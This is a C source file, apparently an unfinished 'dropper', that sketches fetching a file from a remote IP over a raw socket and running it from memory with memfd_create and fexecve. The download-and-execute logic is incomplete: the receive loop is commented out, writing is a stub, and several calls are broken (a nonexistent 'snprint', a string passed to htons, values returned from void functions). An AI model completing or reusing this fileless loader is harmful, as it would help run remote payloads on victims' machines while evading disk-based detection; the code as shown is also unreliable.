/*Golang being annoying with syscalls. Working around issue in C*/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>  
#include <string.h>     
#include <sys/socket.h>
#include <arpa/inet.h> 
#include <sys/mman.h>
#include <curl/curl.h>

int create_memfd(char* fd_name){
    int fd;
    printf("[+] Creating memfd\n");
    fd = memfd_create(fd_name, 0);
    if (fd == -1) {
        perror("memfd_create\n");
        exit(0);
    }
    printf("[+] fd is %d\n", fd);
    return fd;
}


void retrieve_file1(char* ip, char* port, char* filepath) {
    int socket_desc;
    int total_len = 0;
    struct sockaddr_in server;
    char* message;
    char server_reply[10000];
    
    /* Create Socket */
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);
    if (socket_desc == -1) {
        printf("Could not create socket");
    }
    /* Set Options & Connect */
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0) {
        puts("connect error");
        return 1;
    }
    /* Send Request */
    message = snprint("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", filepath, ip);
    if( send(socket_desc , message , strlen(message) , 0) < 0){
        puts("Send failed");
        return 1;
    }
    /* Where I am lost 
    while(1){
        int received_len = recv(socket_desc, server_reply , sizeof server_reply , 0);

        if( received_len < 0 ){
            puts("recv failed");
            break;
        }
        total_len += received_len;
        fwrite(server_reply , received_len , 1, file);
        printf("\nReceived byte size = %d\nTotal lenght = %d", received_len, total_len);

        if( total_len >= file_len ){
            break;
        }   
    }*/
    return;
}


void write_content(){
    printf("[+] Writing to fd\n");
    return;
}


void exec_fd(int fd, char* evp[]){
    printf("[+] Executing file\n");
    pid_t pid = fork();
    if(pid == 0){
        char* fname = snprint("/proc/self/fd/%d", fd);
        char* p_argv[] = {fname, NULL};
        fexecve(fd, p_argv, evp);
    }
    return;
}


int main(int argc, char *argv[], char * envp[]){
    char* fd_name;
    char* url;
    char* usage = "Usage : ./dropper {url}\n";

    fd_name = "psovaya";
    create_memfd(fd_name);
    sleep(20);
    return 0;
}